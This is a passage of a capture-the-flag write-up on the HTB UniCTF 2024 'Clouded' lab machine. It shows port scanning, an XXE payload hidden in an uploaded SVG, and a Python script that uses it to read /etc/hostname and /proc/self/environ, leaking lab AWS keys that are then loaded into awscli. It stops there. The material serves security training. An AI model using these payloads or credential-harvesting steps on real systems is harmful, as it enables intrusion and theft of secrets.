<!doctype html><html lang="en"><head><title>Clouded | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB UniCTF 2024. XXE in SVG file. AWS Lambda and S3 enumeration. SSH brute force. Ansible playbook exploitation"><meta name="image" content="https://7rocky.github.io/images/fullpwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB UniCTF 2024. XXE in SVG file. AWS Lambda and S3 enumeration. SSH brute force. Ansible playbook exploitation"><meta itemprop="keywords" content><meta itemprop="name" content="Clouded"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB UniCTF 2024. XXE in SVG file. AWS Lambda and S3 enumeration. SSH brute force. Ansible playbook exploitation"><meta property="og:image" content="https://7rocky.github.io/images/fullpwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Clouded"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-unictf/clouded/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB UniCTF 2024. XXE in SVG file. AWS Lambda and S3 enumeration. SSH brute force. Ansible playbook exploitation"><meta name="twitter:description" content="HTB UniCTF 2024. XXE in SVG file. AWS Lambda and S3 enumeration. SSH brute force. Ansible playbook exploitation"><meta name="twitter:image" content="https://7rocky.github.io/images/fullpwn.png"><meta name="twitter:title" content="Clouded"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-unictf/clouded/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB UNICTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-unictf/clouded/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-unictf/clouded/&amp;text=Clouded" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-unictf/clouded/&amp;title=Clouded" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Clouded</h1><p class="mb4 f6 dib tracked">10 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-xxe">Exploiting XXE</a></li><li><a href="#localstack-enumeration">LocalStack enumeration</a></li><li><a href="#access-via-ssh">Access via SSH</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.95 scan initiated as: nmap -sC -sV -o nmap/targeted 10.129.243.230 -p 22,80
Nmap scan report for 10.129.243.230
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://clouded.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 12.37 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.129.243.230</code>, we will be redirected to <code>http://clouded.htb</code>, so first we need to enter <code>clouded.htb</code> into <code>/etc/hosts</code>:</p><p><img alt="Clouded 1" src="/images/other/HTB%20UniCTF/Clouded-1.webp"></p><p>There is also an &ldquo;About&rdquo; page that tells something about cloud services and file uploads:</p><p><img alt="Clouded 2" src="/images/other/HTB%20UniCTF/Clouded-2.webp"></p><p>The only functionality of this website is to upload files (only <code>.pdf</code>, <code>.docx</code>, <code>.png</code> or <code>.svg</code>):</p><p><img alt="Clouded 3" src="/images/other/HTB%20UniCTF/Clouded-3.webp"></p><p>For instance, we can upload a dummy PNG image, and we will receive a link to download it afterwards:</p><p><img alt="Clouded 4" src="/images/other/HTB%20UniCTF/Clouded-4.webp"></p><p>Notice that we have a subdomain <code>local.clouded.htb</code>, so we need to put it in <code>/etc/hosts</code>.</p><p>If we try any other route, we receive a response in XML, which is pretty weird nowadays:</p><p><img alt="Clouded 5" src="/images/other/HTB%20UniCTF/Clouded-5.webp"></p><h2 id="foothold">Foothold</h2><p>Having a response in XML is probably because the attack vector is XML External Entity (XXE) injection or some other vulnerability related to XML. In fact, the server allows <code>.svg</code> images, that are pretty much XML.</p><h3 id="exploiting-xxe">Exploiting XXE</h3><p>We can have a look at <a target="_blank" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg">PayloadsAllTheThings</a> and notice that there is a payload for XXE inside an SVG file:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;?</span><span class="mtk5">xml</span><span class="mtk8"> version</span><span class="mtk1">=</span><span class="mtk4">"1.0"</span><span class="mtk8"> standalone</span><span class="mtk1">=</span><span class="mtk4">"yes"</span><span class="mtk1">?&gt;</span>
<span class="mtk1">&lt;!</span><span class="mtk5">DOCTYPE</span><span class="mtk1"> </span><span class="mtk9">test</span><span class="mtk1"> [ &lt;!</span><span class="mtk5">ENTITY</span><span class="mtk1"> </span><span class="mtk9">xxe</span><span class="mtk5"> SYSTEM </span><span class="mtk4">"</span><span class="mtk4 detected-link">file:///etc/hostname</span><span class="mtk4">"</span><span class="mtk1"> &gt; ]&gt;</span>
<span class="mtk1">&lt;</span><span class="mtk5">svg</span><span class="mtk1"> </span><span class="mtk8">width</span><span class="mtk1">=</span><span class="mtk4">"128px"</span><span class="mtk1"> </span><span class="mtk8">height</span><span class="mtk1">=</span><span class="mtk4">"128px"</span><span class="mtk1"> </span><span class="mtk8">xmlns</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://www.w3.org/2000/svg</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk8">xmlns:xlink</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://www.w3.org/1999/xlink</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk8">version</span><span class="mtk1">=</span><span class="mtk4">"1.1"</span><span class="mtk1">&gt;</span>  
<span class="mtk1">   &lt;</span><span class="mtk5">text</span><span class="mtk1"> </span><span class="mtk8">font-size</span><span class="mtk1">=</span><span class="mtk4">"16"</span><span class="mtk1"> </span><span class="mtk8">x</span><span class="mtk1">=</span><span class="mtk4">"0"</span><span class="mtk1"> </span><span class="mtk8">y</span><span class="mtk1">=</span><span class="mtk4">"16"</span><span class="mtk1">&gt;</span><span class="mtk6">&amp;xxe;</span><span class="mtk1">&lt;/</span><span class="mtk5">text</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;/</span><span class="mtk5">svg</span><span class="mtk1">&gt;</span>
</code></pre></div><p>We can try this payload and it actually works, because <code>b3c1706ff55c</code> is the content of <code>/etc/hostname</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> local.clouded.htb/uploads/file_ejTP14NY4b.svg
&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="128px" height="128px" version="1.1"&gt;  
  &lt;text font-size="16" x="0" y="16"&gt;b3c1706ff55c
&lt;/text&gt;
&lt;/svg&gt;
</code></pre></div><p>Since XXE allows to read local files from the server as long as we know the full path, we can try to read common Linux files. For example, <code>/etc/passwd</code>, <code>/etc/hosts</code>&mldr; Since we are going to try many files, let&rsquo;s write a simple Python script to automate the process:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">base64</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8">b64encode</span>

<span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>

<span class="mtk1">svg</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'''&lt;?xml version="1.0" standalone="yes"?&gt;</span>
<span class="mtk4">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "</span><span class="mtk6">{</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">" &gt; ]&gt;</span>
<span class="mtk4">&lt;svg width="128px" height="128px" xmlns="</span><span class="mtk4 detected-link">http://www.w3.org/2000/svg</span><span class="mtk4">" xmlns:xlink="</span><span class="mtk4 detected-link">http://www.w3.org/1999/xlink</span><span class="mtk4">" version="1.1"&gt;</span>  
<span class="mtk4">  &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;</span>
<span class="mtk4">&lt;/svg&gt;</span>
<span class="mtk4">'''</span>

<span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span>
<span class="mtk1">        </span><span class="mtk4">'</span><span class="mtk4 detected-link">http://clouded.htb/upload/prod/lambda</span><span class="mtk4">'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">            </span><span class="mtk4">'filename'</span><span class="mtk1">: </span><span class="mtk4">'xxe.svg'</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk4">'fileData'</span><span class="mtk1">: </span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk1">svg</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()).</span><span class="mtk8">decode</span><span class="mtk1">()</span>
<span class="mtk1">        }</span>
<span class="mtk1">    ).</span><span class="mtk8">json</span><span class="mtk1">()</span>

<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1">.get(</span><span class="mtk4">'url'</span><span class="mtk1">)):</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">url</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk1">url</span><span class="mtk1">).</span><span class="mtk1">text</span><span class="mtk1">)</span>
</code></pre></div><p>We can find that the upload request is made to <code>http://clouded.htb/uploads/prod/lambda</code>, using the developer tools of the browser. The &ldquo;lambda&rdquo; word is probably related to <a target="_blank" href="https://aws.amazon.com/pm/lambda/">AWS Lambda</a>. It makes sense because the machine is called Clouded, and we have a subdomain called <code>local</code>, which probably refers to <a target="_blank" href="https://github.com/localstack/localstack">LocalStack</a> (a cloud service emulator for AWS).</p><h3 id="localstack-enumeration">LocalStack enumeration</h3><p>As a result, we can try to enumerate the AWS Lambda by printing its environment variables from the file <code>/proc/self/environ</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">xxe.py</span> file:///proc/self/environ
http://local.clouded.htb/uploads/file_wY8AhPHsAr.svg
&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="128px" height="128px" version="1.1"&gt;
  &lt;text font-size="16" x="0" y="16"&gt;AWS_LAMBDA_FUNCTION_VERSION=$LATESTEDGE_PORT=4566HOSTNAME=4ed2a07af507_LAMBDA_CONTROL_SOCKET=14AWS_LAMBDA_FUNCTION_TIMEOUT=10LOCALSTACK_HOSTNAME=172.18.0.2AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/UploadToS3LAMBDA_TASK_ROOT=/var/taskLD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/libAWS_LAMBDA_RUNTIME_API=127.0.0.1:9001AWS_LAMBDA_LOG_STREAM_NAME=2024/12/17/[$LATEST]c8930b3e569ee0426ec5fa6517cacdee_LAMBDA_SHARED_MEM_FD=11AWS_EXECUTION_ENV=AWS_Lambda_python3.8_LAMBDA_RUNTIME_LOAD_TIME=1530232235231AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000AWS_LAMBDA_FUNCTION_NAME=UploadToS3PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin_LAMBDA_LOG_FD=9AWS_DEFAULT_REGION=us-east-1PWD=/var/taskAWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDA_RUNTIME_DIR=/var/runtimeLANG=en_US.UTF-8TZ=:UTCAWS_REGION=us-east-1AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL=0HOME=/home/sbx_user1051AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:UploadToS3_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2_AWS_XRAY_DAEMON_PORT=2000_X_AMZN_TRACE_ID=Root=1-dc99d00f-c079a84d433534434534ef0d;Parent=91ed514f1e5c03b2;Sampled=1_LAMBDA_SB_ID=7AWS_XRAY_CONTEXT_MISSING=LOG_ERROR_LAMBDA_CONSOLE_SOCKET=16AWS_LAMBDA_COGNITO_IDENTITY={}_HANDLER=handler.lambda_handlerDOCKER_LAMBDA_USE_STDIN=1AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1536&lt;/text&gt;  
&lt;/svg&gt;
</code></pre></div><p>It is shown in one line, but we can easily determine variable names and values:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">AWS_LAMBDA_FUNCTION_VERSION</span><span class="mtk1">=$LATEST</span>
<span class="mtk5">EDGE_PORT</span><span class="mtk1">=4566</span>
<span class="mtk5">HOSTNAME</span><span class="mtk1">=295a6f9edbe3</span>
<span class="mtk5">_LAMBDA_CONTROL_SOCKET</span><span class="mtk1">=14</span>
<span class="mtk5">AWS_LAMBDA_FUNCTION_TIMEOUT</span><span class="mtk1">=10</span>
<span class="mtk5">LOCALSTACK_HOSTNAME</span><span class="mtk1">=172.18.0.2</span>
<span class="mtk5">AWS_LAMBDA_LOG_GROUP_NAME</span><span class="mtk1">=/aws/lambda/UploadToS3</span>
<span class="mtk5">LAMBDA_TASK_ROOT</span><span class="mtk1">=/var/task</span>
<span class="mtk5">LD_LIBRARY_PATH</span><span class="mtk1">=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var</span><span class="mtk1">/runtime/lib:/var/task:/var/task/lib:/opt/lib</span>  
<span class="mtk5">AWS_LAMBDA_RUNTIME_API</span><span class="mtk1">=127.0.0.1:9001</span>
<span class="mtk5">AWS_LAMBDA_LOG_STREAM_NAME</span><span class="mtk1">=2024/12/14/[$LATEST]f916f3f686ff4f8dfecf52de7db0d</span><span class="mtk1">42a</span>
<span class="mtk5">_LAMBDA_SHARED_MEM_FD</span><span class="mtk1">=11</span>
<span class="mtk5">AWS_EXECUTION_ENV</span><span class="mtk1">=AWS_Lambda_python3.8</span>
<span class="mtk5">_LAMBDA_RUNTIME_LOAD_TIME</span><span class="mtk1">=1530232235231</span>
<span class="mtk5">AWS_XRAY_DAEMON_ADDRESS</span><span class="mtk1">=169.254.79.2:2000</span>
<span class="mtk5">AWS_LAMBDA_FUNCTION_NAME</span><span class="mtk1">=UploadToS3</span>
<span class="mtk5">PATH</span><span class="mtk1">=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/</span><span class="mtk1">bin</span>
<span class="mtk5">_LAMBDA_LOG_FD</span><span class="mtk1">=9</span>
<span class="mtk5">AWS_DEFAULT_REGION</span><span class="mtk1">=us-east-1</span>
<span class="mtk5">PWD</span><span class="mtk1">=/var/task</span>
<span class="mtk5">AWS_SECRET_ACCESS_KEY</span><span class="mtk1">=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUY</span>
<span class="mtk5">LAMBDA_RUNTIME_DIR</span><span class="mtk1">=/var/runtime</span>
<span class="mtk5">LANG</span><span class="mtk1">=en_US.UTF-8</span>
<span class="mtk5">TZ</span><span class="mtk1">=:UTC</span>
<span class="mtk5">AWS_REGION</span><span class="mtk1">=us-east-1</span>
<span class="mtk5">AWS_ACCESS_KEY_ID</span><span class="mtk1">=AKIA5M34BDN8GCJGRFFB</span>
<span class="mtk5">SHLVL</span><span class="mtk1">=0</span>
<span class="mtk5">HOME</span><span class="mtk1">=/home/sbx_user1051</span>
<span class="mtk5">AWS_LAMBDA_FUNCTION_INVOKED_ARN</span><span class="mtk1">=arn:aws:lambda:us-east-1:000000000000:function:Up</span><span class="mtk1">loadToS3</span>
<span class="mtk5">_AWS_XRAY_DAEMON_ADDRESS</span><span class="mtk1">=169.254.79.2</span>
<span class="mtk5">_AWS_XRAY_DAEMON_PORT</span><span class="mtk1">=2000</span>
<span class="mtk5">_X_AMZN_TRACE_ID</span><span class="mtk1">=</span><span class="mtk5">Root</span><span class="mtk1">=1-dc99d00f-c079a84d433534434534ef0d</span><span class="mtk3">;Parent=91ed514f1e5c03b2;Sampled=1_LAMBDA_SB_ID=7</span>
<span class="mtk5">AWS_XRAY_CONTEXT_MISSING</span><span class="mtk1">=LOG</span>
<span class="mtk5">_ERROR_LAMBDA_CONSOLE_SOCKET</span><span class="mtk1">=16</span>
<span class="mtk5">AWS_LAMBDA_COGNITO_IDENTITY</span><span class="mtk1">={}</span>
<span class="mtk5">_HANDLER</span><span class="mtk1">=handler.lambda_handler</span>
<span class="mtk5">DOCKER_LAMBDA_USE_STDIN</span><span class="mtk1">=1</span>
<span class="mtk5">AWS_LAMBDA_FUNCTION_MEMORY_SIZE</span><span class="mtk1">=1536</span>
</code></pre></div><p>With this information, we can use <code>awscli</code> to interact with LocalStack and enumerate Lambda functions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">aws</span> configure
AWS Access Key ID [None]: AKIA5M34BDN8GCJGRFFB
AWS Secret Access Key [None]: eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUY
Default region name [None]: us-east-1
Default output format [None]:

